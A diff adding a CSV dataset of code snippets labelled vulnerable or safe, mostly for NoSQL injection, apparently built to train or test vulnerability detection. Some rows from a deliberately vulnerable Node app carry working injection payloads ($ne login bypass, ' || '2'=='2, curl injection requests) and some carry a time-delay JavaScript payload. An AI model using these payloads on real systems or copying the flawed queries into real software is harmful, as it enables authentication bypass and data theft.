@@ -1,0 +1,1372 @@
+code,target,source,link
+"HashMap<String, String> paramMap = new HashMap<>();
+paramMap.put(""sharedWith"", userName);
+paramMap.put(""email"", email);
+String json = new JSONObject(paramMap).toString();
+BasicDBObject query = new BasicDBObject().parse(json);
+
+MongoCursor<Document> cursor = collection.find(query).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+db.myCollection.find( { $where: function() { return obj.credits - obj.debits < 0; } } );,1,OWASP,https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
+"Bson filter = Filters.and(Filters.eq(""sharedWith"", userName), Filters.eq(""email"", email));
+
+MongoCursor<Document> cursor = collection.find(filter).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"import org.codehaus.janino.ScriptEvaluator;
+
+@Controller
+public class ExampleController
+{
+    @GetMapping(value = ""/"")
+    public void exec(@RequestParam(""message"") String message) throws IOException, InvocationTargetException {
+        ScriptEvaluator se = new ScriptEvaluator();
+        se.setParameters(new String[] { ""input"" }, new Class[] { String.class });
+        se.cook(""System.out.println(input);"");
+        se.evaluate(new Object[] { message });
+    }
+}",0,SonarSource,https://rules.sonarsource.com/java/type/Vulnerability/RSPEC-5334/
+"$username = $_POST['username'];
+$password = $_POST['password'];
+$connection = new MongoDB\Client('mongodb://localhost:27017');
+if($connection) {
+ $db = $connection->test;
+ $users = $db->users;
+ $query = array(
+  ""user"" => $username,
+  ""password"" => $password
+ );
+ $req = $users->findOne($query);
+}",1,GitHub,https://github.com/DevanshRaghav75/NoSQL_injection_stuff
+"public class ApiController
+{
+    @Autowired
+    Connection connection;
+
+    @GetMapping(value = ""/authenticate"")
+    @ResponseBody
+    public ResponseEntity<String> authenticate(
+        @RequestParam(""user"") String user,
+        @RequestParam(""pass"") String pass) throws SQLException
+    {
+        String query = ""SELECT * FROM users WHERE user = ? AND pass = ?"";
+
+        try (PreparedStatement statement = connection.prepareStatement(query)) {
+            statement.setString(1, user);
+            statement.setString(2, pass);
+
+            ResultSet resultSet = statement.executeQuery(query);
+
+            if (!resultSet.next()) {
+                return new ResponseEntity<>(""Unauthorized"", HttpStatus.UNAUTHORIZED);
+            }
+        }
+
+        return new ResponseEntity<>(""Authentication Success"", HttpStatus.OK);
+    }
+}",0,SonarSource,https://rules.sonarsource.com/java/type/Vulnerability/RSPEC-5147/
+"    @POST
+    @Path(""/binary"")
+    public String saveBinary(InputStream userStream) throws SQLException, ClassNotFoundException, IOException {
+        Log.info(""Saving binary user "");
+        ObjectInputStream objectInputStream = new ObjectInputStream(userStream);
+        User user = (User) objectInputStream.readObject();
+        return String.valueOf(dbService.save(user));
+    }
+
+   class User implements Serializable {
+       private static final long serialVersionUID = 1L;
+       private String name;  
+
+       public User(String name) {
+           this.name = name;
+       }
+
+       public String getName() {
+           return name;
+       }
+   }",1,SonarSource,https://www.sonarsource.com/blog/top-security-flaws-hiding-in-your-code-right-now-and-how-to-fix-them/
+"using MongoDB.Driver;
+using MongoDB.Bson;
+
+[ApiController]
+[Route(""Example"")]
+public class ExampleController: ControllerBase
+{
+    private string connectionString;
+
+    [Route(""Example"")]
+    public async Task<string> Example()
+    {
+        var client     = new MongoClient(connectionString);
+        var database   = client.GetDatabase(""example"");
+        var collection = database.GetCollection<Message>(""messages"");
+
+        var filterDefinition = Builders<BsonDocument>.Filter.Eq(""Username"", ""Example"");
+
+        await collection.FindAsync(filter)
+    }
+}",0,SonarSource,https://rules.sonarsource.com/csharp/?search=nosql
+" public class SecureObjectInputStream extends ObjectInputStream {
+   private static final Set<String> ALLOWED_CLASSES = Set.of(User.class.getName());
+
+   @Override
+   protected Class<?> resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException {
+     if (!ALLOWED_CLASSES.contains(osc.getName())) {
+       throw new InvalidClassException(""Unauthorized deserialization"", osc.getName());
+     }
+
+     return super.resolveClass(osc);
+   }
+ }
+...    
+ public class RequestProcessor {
+   protected void doGet(HttpServletRequest request, HttpServletResponse response) {
+     ServletInputStream servletIS = request.getInputStream();
+     ObjectInputStream  objectIS  = new SecureObjectInputStream(servletIS);
+     User input                 = (User) objectIS.readObject();
+   }
+ }",0,SonarSource,https://www.sonarsource.com/blog/top-security-flaws-hiding-in-your-code-right-now-and-how-to-fix-them/
+"$username = $_POST['username'];
+$password = $_POST['password'];
+$connection = new MongoDB\Client('mongodb://localhost:27017');
+if($connection) {
+ $db = $connection->test;
+ $users = $db->users;
+ $query = array(
+  ""user"" => $username,
+  ""password"" => $password
+ );
+ $req = $users->findOne($query);
+}",1,Acunetix,https://www.acunetix.com/blog/web-security-zone/nosql-injections/
+"const express = require('express');
+const qs = require('querystring');
+const app = express();
+const productRoutes = express.Router();
+
+let Product = require('../models/Product');
+
+productRoutes.route('/lookup').get(function(req, res) {
+	let category = req.query.category;
+  console.log(""raw category from querystring: "" + category);
+	console.log(""JSON.stringify category from querystring: "" + JSON.stringify(category));
+	if (typeof category !== 'undefined' && category != """") {
+		query = { $where: `this.category == '${category}' && this.released == 1` }
+		//Simple injection: pass in ""' || '2'=='2"" (without double quotes)
+		// This will return all records
+		//
+		// JS injection is also possible here, because the where clause evaluates a JS expression
+    console.log(""Raw MongoDB query: "" + query);
+		console.log(""JSON.stringify MongoDB query: "" + JSON.stringify(query));
+		Product.find(query)
+		    .then(products => {
+		        console.log(""Data Retrieved: "" + products);
+		        res.render('productlookup', { title: 'Product Lookup', products: products });
+		    })
+		    .catch(err => {
+		        console.log(err);
+		        res.json(err);
+		    });
+	}
+	else {
+		res.render('productlookup', { title: 'Product Lookup', products:[]});
+	}	
+});
+
+
+/** Allow a similar query using POST and JSON
+  * Similar to above, inject data like
+  * {""category"":""' || '2'=='2""}
+
+  Sample default CURL request::
+	curl -X POST http://localhost:4000/product/lookup -H 'Content-Type: application/json' -d '{""category"": ""guest""}'
+  And Injection (need to escape our injected single quotes for CURL only):
+	curl -X POST http://localhost:4000/product/lookup -H 'Content-Type: application/json' -d '{""category"": ""guest'\'' || '\''2'\''=='\''2""}'
+  */
+productRoutes.route('/lookup').post(function(req, res) {
+	let category = req.body.category;
+  console.log(""raw category from body: "" + category);
+	console.log(""JSON.stringify category from body: "" + JSON.stringify(category));
+	if (typeof category !== 'undefined') {
+		query = { $where: `this.category == '${category}' && this.released == 1` }
+    console.log(""Raw MongoDB query: "" + query);
+		console.log(""JSON.stringify MongoDB query: "" + JSON.stringify(query));
+		Product.find(query)
+		    .then(products => {
+		        console.log(""Data Retrieved: "" + products);
+		        res.json({products});
+		    })
+		    .catch(err => {
+		        console.log(err);
+		        res.json(err);
+		    });
+	}
+	else {
+		res.json({});
+	}	
+});
+
+productRoutes.route('/lookup2').get(lookup2);
+
+productRoutes.route('/lookup2').post(lookup2);
+
+function lookup2(req, res) {
+	let query = req.body;
+  if (typeof query === 'undefined' || Object.keys(query).length <= 0) {
+    query = req.query;
+  }
+  console.log(""raw request body: "" + query);
+  if (typeof query !== 'undefined' && Object.keys(query).length > 0) {
+  	console.log(""JSON.stringify request body: "" + JSON.stringify(query));
+   
+    query.released = 1;
+    console.log(""raw MongoDB query: "" + query);
+  	console.log(""JSON.stringify MongoDB query: "" + JSON.stringify(query));
+  	Product.find(query)
+  	    .then(products => {
+  	        console.log(""Data Retrieved: "" + products);
+  	        res.render('productlookup', { title: 'Product Lookup 2', products: products });
+  	    })
+  	    .catch(err => {
+  	        console.log(err);
+  	        res.json(err);
+  	    });
+  }
+	else {
+		res.json({});
+	}	
+}
+
+productRoutes.route('/lookup3').get(function(req, res) {
+	res.render('productlookup', { title: 'Product Lookup 3'});
+});
+
+productRoutes.route('/lookup3').post(function(req, res) {
+	let categoryData = req.body.category;
+	let query = `{""category"": ""${categoryData}"", ""released"": 1}`
+	query = JSON.parse(query)
+	console.log(""request "" + JSON.stringify(query));
+	query = {category: query.category}
+	console.log(""request "" + JSON.stringify(query));
+
+	console.log(""MongoDB query: "" + JSON.stringify(query));
+	Product.find(query)
+	    .then(products => {
+	        console.log(""Data Retrieved: "" + products);
+	        res.render('productlookup', { title: 'Product Lookup 3', products: products });
+	    })
+	    .catch(err => {
+	        console.log(err);
+	        res.json(err);
+	    });
+});
+
+
+/*
+
+This is similar to /lookup but uses backticks
+*/
+
+productRoutes.route('/lookup4').post(function(req, res) {
+	let category = req.body.category;
+	console.log(""request "" + JSON.stringify(category));
+	if (typeof category !== 'undefined') {
+		query = { $where: 'this.category == `'+category+'` && this.released == 1' }
+		console.log(""MongoDB query: "" + JSON.stringify(query));
+		Product.find(query)
+		    .then(products => {
+		        console.log(""Data Retrieved: "" + products);
+		        res.json({products});
+		    })
+		    .catch(err => {
+		        console.log(err);
+		        res.json(err);
+		    });
+	}
+	else {
+		res.json({});
+	}	
+});
+
+productRoutes.route('/lookup4').get(function(req, res) {
+	res.render('productlookup', { title: 'Product Lookup 4'});
+});
+
+
+/*
+
+This passes the whole request body through as a JSON string without parsing it so it only supports POST!
+*/
+
+var rawBodySaver = function (req, res, buf, encoding) {
+  if (buf && buf.length) {
+    req.rawBody = buf.toString(encoding || 'utf8');
+  }
+}
+
+
+productRoutes.route('/lookup_raw').post(express.raw({ verify: rawBodySaver, type: () => true }), 
+  (req, res) => {
+    sendRawReqBodyThrough(req,res);
+  }
+);
+
+
+function sendRawReqBodyThrough(req, res){
+  query = JSON.parse(req.rawBody);
+  console.log(""raw request body: "" + query);
+  if (typeof query !== 'undefined') {
+  	console.log(""JSON.stringify request body: "" + JSON.stringify(query));
+
+    console.log(""raw MongoDB query: "" + query);
+  	console.log(""JSON.stringify MongoDB query: "" + JSON.stringify(query));
+  	Product.find(query)
+  	    .then(products => {
+  	        console.log(""Data Retrieved: "" + products);
+  	        res.render('productlookup', { title: 'Product Lookup 5', products: products });
+  	    })
+  	    .catch(err => {
+  	        console.log(err);
+  	        res.json(err);
+  	    });
+  }
+	else {
+		res.json({});
+	}	
+}
+
+/*
+
+This is similar to /lookup2 but with aggregate
+*/
+
+productRoutes.route('/lookup_agg').get(function(req, res) {
+	res.render('productlookup2', { title: 'Product Lookup 5'});
+});
+
+productRoutes.route('/lookup_agg').post(function(req, res) {
+	let query = req.body;
+  if (typeof query !== 'undefined' && Object.keys(query).length > 0) {
+	console.log(""request "" + JSON.stringify(query));
+
+	console.log(""MongoDB query: "" + JSON.stringify(query));
+	Product.aggregate(query)
+	    .then(products => {
+	        console.log(""Data Retrieved: "" + products);
+	        res.json({products});
+	    })
+	    .catch(err => {
+	        console.log(err);
+	        res.json(err);
+	    });
+  }
+	else {
+		res.json({});
+	}	
+});
+
+
+module.exports = productRoutes;",1,GitHub,https://github.com/irsdl/vulnerable-node-app
+"<?
+$mongo = new Mongo();
+$db = $mongo->demo;
+$year = $_GET['year'];
+$collection = $db->demo;
+$query = 'function() {var search_year = \'' .
+$year . '\';' .
+'return this.publicationYear == search_year || ' .
+' this.filmingYear == search_year || ' .
+' this.recordingYear == search_year;}';
+$cursor = $collection->find(array('$where' => $query));
+...
+?>",1,SyHunt,https://www.syhunt.com/en/?n=Articles.NoSQLInjection
+"BasicDBObject query = (BasicDBObject) BasicDBObjectBuilder
+            .start()
+            .add(""sharedWith"", userName)
+            .add(""email"", email)
+            .get();
+
+MongoCursor<Document> cursor = collection.find(query).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"app.post('/login', function (req, res){
+    let query = {
+        username: req.body.username,
+        password: req.body.password
+    }
+ 
+    db.collection('user').find(query, function (err) {
+        if (err) {
+            response.status(401).json({
+                status: ""error"",
+                message: ""Invalid credentials."",
+              });
+        } else {
+            if (user.length >= 1) {
+                res.json({username: user[0].username });
+            }
+        }
+    });
+});",1,Snyk,https://learn.snyk.io/lesson/nosql-injection-attack/
+"const express = require('express');
+const qs = require('querystring');
+const app = express();
+const userRoutes = express.Router();
+
+let User = require('../models/User');
+
+userRoutes.route('/lookup').get(function(req, res) {
+	let username = req.query.username;
+	console.log(""request "" + JSON.stringify(username));
+	if (typeof username !== 'undefined' && username != """") {
+		query = { $where: `this.username == '${username}'` }
+		//Simple injection: pass in ""' || '2'=='2"" (without double quotes)
+		// This will return all records
+		//
+		// JS injection is also possible here, because the where clause evaluates a JS expression
+		console.log(""Mongo query: "" + JSON.stringify(query));
+		User.find(query)
+		    .then(users => {
+		        console.log(""Data Retrieved: "" + users);
+		        res.render('userlookup', { title: 'User Lookup', users: users });
+		    })
+		    .catch(err => {
+		        console.log(err);
+		        res.json(err);
+		    });
+	}
+	else {
+		res.render('userlookup', { title: 'User Lookup', users:[]});
+	}	
+});
+
+
+/** Allow a similar query using POST and JSON
+  * Similar to above, inject data like
+  * {""username"":""' || '2'=='2""}
+
+  Sample default CURL request::
+	curl -X POST http://localhost:4000/user/lookup -H 'Content-Type: application/json' -d '{""username"": ""guest""}'
+  And Injection (need to escape our injected single quotes for CURL only):
+	curl -X POST http://localhost:4000/user/lookup -H 'Content-Type: application/json' -d '{""username"": ""guest'\'' || '\''2'\''=='\''2""}'
+  */
+userRoutes.route('/lookup').post(function(req, res) {
+	let username = req.body.username;
+	console.log(""request "" + JSON.stringify(username));
+	if (typeof username !== 'undefined') {
+		query = { $where: `this.username == '${username}'` }
+		console.log(""Mongo query: "" + JSON.stringify(query));
+		User.find(query)
+		    .then(users => {
+		        console.log(""Data Retrieved: "" + users);
+            res.render('userlookup', { title: 'User Lookup', users: users });
+		        //res.json({users});
+		    })
+		    .catch(err => {
+		        console.log(err);
+		        res.json(err);
+		    });
+	}
+	else {
+		res.json({});
+	}	
+});
+
+userRoutes.route('/lookup2').get(function(req, res) {
+	res.render('userlookup2', { title: 'User Lookup 2'});
+});
+
+userRoutes.route('/lookup2').post(function(req, res) {
+	let query = req.body;
+  if (typeof query !== 'undefined' && Object.keys(query).length > 0) {
+	console.log(""request "" + JSON.stringify(query));
+
+	console.log(""Mongo query: "" + JSON.stringify(query));
+	User.find(query)
+	    .then(users => {
+	        console.log(""Data Retrieved: "" + users);
+	        res.render('userlookup2', { title: 'User Lookup 2', users: users });
+	    })
+	    .catch(err => {
+	        console.log(err);
+	        res.json(err);
+	    });
+  }
+	else {
+		res.json({});
+	}	
+});
+
+userRoutes.route('/lookup3').get(function(req, res) {
+	res.render('userlookup3', { title: 'User Lookup 3'});
+});
+
+userRoutes.route('/lookup3').post(function(req, res) {
+	let usernameData = req.body.username;
+	let query = `{""username"": ""${usernameData}""}`
+	query = JSON.parse(query)
+	console.log(""request "" + JSON.stringify(query));
+	query = {username: query.username}
+	console.log(""request "" + JSON.stringify(query));
+
+	console.log(""Mongo query: "" + JSON.stringify(query));
+	User.find(query)
+	    .then(users => {
+	        console.log(""Data Retrieved: "" + users);
+	        res.render('userlookup3', { title: 'User Lookup 3', users: users });
+	    })
+	    .catch(err => {
+	        console.log(err);
+	        res.json(err);
+	    });
+});
+
+
+/*
+
+This is similar to /lookup but uses backticks
+*/
+
+userRoutes.route('/lookup4').post(function(req, res) {
+	let username = req.body.username;
+	console.log(""request "" + JSON.stringify(username));
+	if (typeof username !== 'undefined') {
+		query = { $where: 'this.username == `'+username+'`' }
+		console.log(""Mongo query: "" + JSON.stringify(query));
+		User.find(query)
+		    .then(users => {
+		        console.log(""Data Retrieved: "" + users);
+		        res.json({users});
+		    })
+		    .catch(err => {
+		        console.log(err);
+		        res.json(err);
+		    });
+	}
+	else {
+		res.json({});
+	}	
+});
+
+userRoutes.route('/lookup4').get(function(req, res) {
+	res.render('userlookup', { title: 'User Lookup 4'});
+});
+
+
+/*
+
+This is similar to /lookup2 but with aggregate
+*/
+
+userRoutes.route('/lookup5').get(function(req, res) {
+	res.render('userlookup2', { title: 'User Lookup 5'});
+});
+
+userRoutes.route('/lookup5').post(function(req, res) {
+	let query = req.body;
+  if (typeof query !== 'undefined' && Object.keys(query).length > 0) {
+	console.log(""request "" + JSON.stringify(query));
+
+	console.log(""Mongo query: "" + JSON.stringify(query));
+	User.aggregate(query)
+	    .then(users => {
+	        console.log(""Data Retrieved: "" + users);
+	        res.json({users});
+	    })
+	    .catch(err => {
+	        console.log(err);
+	        res.json(err);
+	    });
+  }
+	else {
+		res.json({});
+	}	
+});
+
+userRoutes.route('/login').get(function(req, res) {
+	res.render('userlogin', { title: 'User Login', role: ""None""});
+});
+
+/*
+* This is injectable since we are passing json.
+* The following payload will log you in as the specified user
+* {""username"":""admin"",""password"":{""$ne"": 1}}
+*
+* You can iterate through users using something like:
+* {""username"":{""$gt"": ""h""},""password"":{""$ne"": 1}}
+* 
+* Submitting this probably requires a proxy (or browser interception), since by default
+* the form password value will become a string, but an object needs to be passed.
+*/
+userRoutes.route('/login').post(function(req, res) {
+	let uname = req.body.username;
+	let pass = req.body.password;
+	console.log(""Login request "" + JSON.stringify(req.body));
+	let query = { 
+		username: uname,
+		password: pass 
+	}
+
+	console.log(""Mongo query: "" + JSON.stringify(query));
+	User.find(query)
+	    .then(user => {
+	        console.log(user);
+	        if (user.length >= 1) {
+	            var msg = ""Logged in as user "" + user[0].username + "" with role "" + user[0].role;
+	            res.json({role: user[0].role, username: user[0].username, msg: msg });
+	        } else {
+	            res.json({role: ""invalid"", msg: ""Invalid username or password.""});
+	        }
+	    })
+	    .catch(err => {
+	        console.log(err);
+	        res.json(err);
+	    });
+});
+
+/* Similar to /login but only allow 1 user to be selected! */
+userRoutes.route('/login2').post(function(req, res) {
+	let uname = req.body.username;
+	let pass = req.body.password;
+	console.log(""Login request "" + JSON.stringify(req.body));
+	let query = { 
+		username: uname,
+		password: pass 
+	}
+
+	console.log(""Mongo query: "" + JSON.stringify(query));
+	User.find(query)
+	    .then(user => {
+	        console.log(user);
+	        if (user.length === 1) {
+	            var msg = ""Logged in as user "" + user[0].username + "" with role "" + user[0].role;
+	            res.json({role: user[0].role, username: user[0].username, msg: msg });
+	        } else if (user.length > 1) {
+              res.json({role: ""invalid"", msg: ""More than 1 user was selected!""});   
+          } else {
+	            res.json({role: ""invalid"", msg: ""Invalid username or password.""});
+	        }
+	    })
+	    .catch(err => {
+	        console.log(err);
+	        res.json(err);
+	    });
+});
+
+
+/* similar to /login2 but this uses the whole request body but also make sure it contains username and password */
+userRoutes.route('/login3').post(function(req, res) {
+	let query = req.body;
+
+  if (typeof query !== 'undefined' && Object.keys(query).length > 0 && typeof query.username !== 'undefined'&& typeof query.password !== 'undefined') {
+	console.log(""request "" + JSON.stringify(query));
+	console.log(""Mongo query: "" + JSON.stringify(query));
+	User.find(query)
+	    .then(user => {
+	        console.log(user);
+	        if (user.length === 1) {
+              if(!user[0].locked){
+                var msg = ""Logged in as user "" + user[0].username + "" with role "" + user[0].role;
+  	            res.json({role: user[0].role, username: user[0].username, msg: msg });
+              }else{
+  	            res.json({role: ""invalid"", msg: ""User is locked: "" + user[0].username });
+              }   
+	            
+	        } else if (user.length > 1) {
+              res.json({role: ""invalid"", msg: ""More than 1 user was selected!""});   
+          } else {
+	            res.json({role: ""invalid"", msg: ""Invalid username or password.""});
+	        }
+	    })
+	    .catch(err => {
+	        console.log(err);
+	        res.json(err);
+	    });
+  }
+	else {
+		res.json({});
+	}	
+});
+
+module.exports = userRoutes;",1,GitHub,https://github.com/irsdl/vulnerable-node-app
+"   public void doGet(HttpServletRequest request, HttpServletResponse response) {
+       String user = request.getParameter(""user"");
+       if (user != null){
+         logger.log(Level.INFO, ""User: {0} login in"", user);
+       }
+   }",1,SonarSource,https://www.sonarsource.com/blog/top-security-flaws-hiding-in-your-code-right-now-and-how-to-fix-them/
+"from mysql.connector import connection
+import os
+
+db_password = os.getenv('DB_PASSWORD')
+connection.MySQLConnection(host='localhost', user='sonarsource', password=db_password)",0,SonarSource,https://rules.sonarsource.com/python/RSPEC-2115/?search=inject
+"const { MongoClient } = require('mongodb');
+
+function (req, res) {
+    let query = { user: req.query.user.toString(), city: req.query.city.toString() };
+
+    MongoClient.connect(url, (err, db) => {
+        db.collection(""users"")
+        .find(query)
+        .toArray((err, docs) => { });
+    });
+}",0,SonarSource,https://rules.sonarsource.com/javascript/RSPEC-5147/?search=nosq
+"BasicDBObject query = new BasicDBObject();
+query.put(""sharedWith"", userName);
+query.put(""email"", email);
+
+MongoCursor<Document> cursor = collection.find(query).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"userRoutes.route('/search').post(function(req, res) {
+    let search = String(req.query.search);
+
+    // Sanitize the input to ensure it's a valid format for your needs
+    // Example: If 'plants' should be a string without special characters, enforce this rule here
+    if (!search.match(/^[a-zA-Z0-9 ]+$/)) {
+        return res.status(400).send('Invalid search input');
+    }
+
+    let query = {plants: search};
+
+    // Using the sanitized 'search' variable in the query
+    db.collection('plants').find(query, function (err, plants) {
+        if (err) {
+            res.status(500).json(err);
+        } else {
+            res.render('plants', { title: 'Plants', plants: plants });
+        }
+    });
+});",0,Snyk,https://learn.snyk.io/lesson/nosql-injection-attack/
+"Bson filter = Filters.and(Filters.eq(""sharedWith"", userName), Filters.eq(""email"", email));
+
+MongoCursor<Document> cursor = collection.find(filter).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"using Microsoft.AspNetCore.Mvc;
+using MongoDB.Driver;
+using System.Threading.Tasks;
+using YourNamespace.Models; // Replace with your actual namespace and model
+
+[Route(""api/[controller]"")]
+[ApiController]
+public class LoginController : ControllerBase {
+    private readonly IMongoCollection<User> _users;
+
+    public LoginController(IMongoDatabase database) {
+        _users = database.GetCollection<User>(""user"");
+    }
+
+    [HttpPost]
+    public async Task<IActionResult> Post([FromBody] User user) {
+        try {
+            var filter = Builders<User>.Filter.Eq(""username"", user.Username) & Builders<User>.Filter.Eq(""password"", user.Password);
+            var foundUser = await _users.Find(filter).FirstOrDefaultAsync();
+
+            if (foundUser != null) {
+                return Ok(new { username = foundUser.Username });
+            } else {
+                return Unauthorized(new { status = ""error"", message = ""Invalid credentials."" });
+            }
+        } catch {
+            return StatusCode(500, new { status = ""error"", message = ""Internal server error."" });
+        }
+    }
+}
+
+public class User {
+    public string Username { get; set; }
+    public string Password { get; set; }
+    // Include other properties as needed
+}",1,Snyk,https://learn.snyk.io/lesson/nosql-injection-attack/
+"<?php
+
+$m = new MongoClient(""mongodb://127.0.0.1:27017"");
+$m->selectDB('foo');
+$collection = $m->selectCollection('test', 'phpmanual');
+
+if ($_GET[""age""] != """") {
+ $js = 'function(){if(this.name == ""Joe""||this.age=='.$_GET[""age""].')return true;}';
+ $cursor = $collection->find(array('$where' => $js));
+ foreach($cursor as $doc) {
+  var_dump($doc);
+ }
+} elseif ($_GET[""name""] != """") {
+ $js = ""function(){var nom = '"".$_GET[""name""].""';return this.name == nom;}"";
+ $cursor = $collection->find(array('$where' => $js));
+ foreach($cursor as $doc) {
+  var_dump($doc);
+ }
+} elseif ($_GET[""weight""] != """") {
+ $js = ""function(){var w8 = \"""".$_GET[""weight""].""\"";return this.weight == w8;}"";
+ $cursor = $collection->find(array('$where' => $js));
+ foreach ($cursor as $doc) {
+  var_dump($doc);
+ }
+} elseif ($_GET[""sex""] != """") {
+ $js = ""function(){return this.sex == \"""".$_GET[""sex""].""\"";}"";
+ $cursor = $collection->find(array('$where' => $js));
+ foreach ($cursor as $doc) {
+  var_dump($doc);
+ }
+} elseif ($_GET[""race""] != """") {
+ $js = ""function(){return this.race == '"".$_GET[""race""].""';}"";
+ $cursor = $collection->find(array('$where' => $js));
+ foreach ($cursor as $doc) {
+  var_dump($doc);
+ }
+}
+
+?>",1,GitHub,https://gist.github.com/brandonprry/c2de8ac2be825007c4de
+"$username = $_GET['username'] //Get username from request
+$password = $_GET['password'] //Get password from request
+
+$query = db.user.find_one({username: ""$username"", password: ""$password""});
+//Do something with the output of query",1,GitHub,https://github.coventry.ac.uk/pages/CUEH/245CT/6_SQLi/NoSQL/
+"BasicDBObject query = new BasicDBObject();
+query.append(""$where"", ""this.sharedWith == \"""" + userName + ""\"" && this.email == \"""" + email + ""\"""");
+
+MongoCursor<Document> cursor = collection.find(query).iterator();",1,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"BasicDBObject query = new BasicDBObject();
+query.put(""$where"", ""this.sharedWith == \"""" + userName + ""\"" && this.email == \"""" + email + ""\"""");
+
+MongoCursor<Document> cursor = collection.find(query).iterator();",1,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"public class SecureObjectInputStream extends ObjectInputStream {
+
+  @Override
+  protected Class<?> resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException {
+
+    List<String> approvedClasses = new ArrayList<String>();
+    approvedClasses.add(AllowedClass1.class.getName());
+    approvedClasses.add(AllowedClass2.class.getName());
+
+    if (!approvedClasses.contains(osc.getName())) {
+      throw new InvalidClassException(""Unauthorized deserialization"", osc.getName());
+    }
+
+    return super.resolveClass(osc);
+  }
+}
+
+public class RequestProcessor {
+  protected void doGet(HttpServletRequest request, HttpServletResponse response) {
+    ServletInputStream servletIS = request.getInputStream();
+    ObjectInputStream  objectIS  = new SecureObjectInputStream(servletIS);
+    Object input                 = objectIS.readObject();
+  }
+}",0,SonarSource,https://rules.sonarsource.com/java/type/Vulnerability/RSPEC-5147/
+"#include <iostream>
+#include <mongocxx/client.hpp>
+#include <mongocxx/instance.hpp>
+#include <bsoncxx/builder/stream/document.hpp>
+#include <bsoncxx/json.hpp>
+
+// Hypothetical function to get user input
+std::string GetUserInput(const std::string& prompt);
+
+int main() {
+    mongocxx::instance inst{};
+    mongocxx::client conn{mongocxx::uri{}};
+
+    auto db = conn[""mydatabase""];
+    auto collection = db[""user""];
+
+    std::string username = GetUserInput(""Username: "");
+    std::string password = GetUserInput(""Password: "");
+
+    bsoncxx::builder::stream::document document{};
+    document << ""username"" << username
+             << ""password"" << password;
+
+    auto cursor = collection.find(document.view());
+    
+    // ... rest of the code to handle the cursor
+}",1,Snyk,https://learn.snyk.io/lesson/nosql-injection-attack/
+function() { return obj.credits—obj.debits < 0;var date=new Date(); do{curDate = new Date();}while(curDate-date<10000); },1,Imperva,https://www.imperva.com/learn/application-security/nosql-injection/
+"$query = array(""user"" => $_POST[""username""], ""password"" => 
+    $_POST[""password""]);",1,Invicti,https://www.invicti.com/blog/web-security/what-is-nosql-injection/
+"#include <mongocxx/client.hpp>
+#include <mongocxx/instance.hpp>
+#include <bsoncxx/builder/stream/document.hpp>
+#include <iostream>
+#include <string>
+
+// Hypothetical function to simulate receiving user input
+std::string GetUserInput();
+
+int main() {
+    mongocxx::instance instance{};
+    mongocxx::client client{mongocxx::uri{}};
+
+    auto collection = client[""mydatabase""][""plants""];
+
+    std::string search = GetUserInput(); // Simulate getting search input from user
+
+    // Use a parameterized query
+    bsoncxx::builder::stream::document filter_builder;
+    filter_builder << ""plants"" << bsoncxx::builder::stream::open_document
+                   << ""$eq"" << search
+                   << bsoncxx::builder::stream::close_document;
+
+    auto cursor = collection.find(filter_builder.view());
+
+    // Process the cursor (e.g., displaying the plants)
+    // ...
+
+    return 0;
+}",0,Snyk,https://learn.snyk.io/lesson/nosql-injection-attack/
+0;var date=new Date(); do{curDate = new Date();}while(curDate-date<10000),1,Imperva,https://www.imperva.com/learn/application-security/nosql-injection/
+"public class AllowedlistJndiContextFactory implements InitialContextFactory {
+   // Define your list of allowed JNDI URLs
+   private static final List<String> ALLOWED_JNDI_PREFIXES = Arrays.asList(
+       ""ldap://trusted-server.com"",
+       ""ldaps://secure-server.com""
+   );
+
+   @Override
+   public Context getInitialContext(Hashtable<?, ?> environment) throws NamingException {
+       String providerUrl = (String) environment.get(Context.PROVIDER_URL);      
+
+       if (isAllowed(providerUrl)) {
+           return new InitialContext(environment); 
+       } else {
+           throw new NamingException(""JNDI lookup "" + providerUrl + "" not allowed"");
+       }
+   }
+   private boolean isAllowed(String url) {
+       if (url == null) {
+           return false;
+       }
+
+       for (String allowedPrefix : ALLOWED_JNDI_PREFIXES) {
+           if (url.startsWith(allowedPrefix)) {
+               return true;
+           }
+       }
+
+       return false;
+   }
+}",0,SonarSource,https://www.sonarsource.com/blog/top-security-flaws-hiding-in-your-code-right-now-and-how-to-fix-them/
+"BasicDBObject query = (BasicDBObject) BasicDBObjectBuilder
+            .start()
+            .append(""sharedWith"", userName)
+            .append(""email"", email)
+            .get();
+
+MongoCursor<Document> cursor = collection.find(query).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"Bson filter = Filters.and(Filters.eq(""sharedWith"", userName), Filters.eq(""email"", email));
+
+MongoCursor<Document> cursor = collection.find(filter).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"Bson filter = Filters.and(Filters.eq(""sharedWith"", userName), Filters.eq(""email"", email));
+
+MongoCursor<Document> cursor = collection.find(filter).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"HashMap<String, String> paramMap = new HashMap<>();
+paramMap.put(""sharedWith"", userName);
+paramMap.put(""email"", email);
+BasicDBObject query = new BasicDBObject(paramMap);
+
+MongoCursor<Document> cursor = collection.find(query).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"$userName = $_POST[‘user’];
+$password = $_POST[‘password’];
+$user = $collection->findOne(
+[
+'user' => ‘$userName’,
+'password' => ‘$password’,
+]
+);",1,Pentestpeople,https://www.pentestpeople.com/blog-posts/nosql-injection-part-1-of-the-sql-series
+"BasicDBObject query = (BasicDBObject) BasicDBObjectBuilder
+            .start(""sharedWith"", userName)
+            .append(""email"", email)
+            .get();
+
+MongoCursor<Document> cursor = collection.find(query).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"BasicDBObject query = new BasicDBObject();
+HashMap<String, String> paramMap = new HashMap<>();
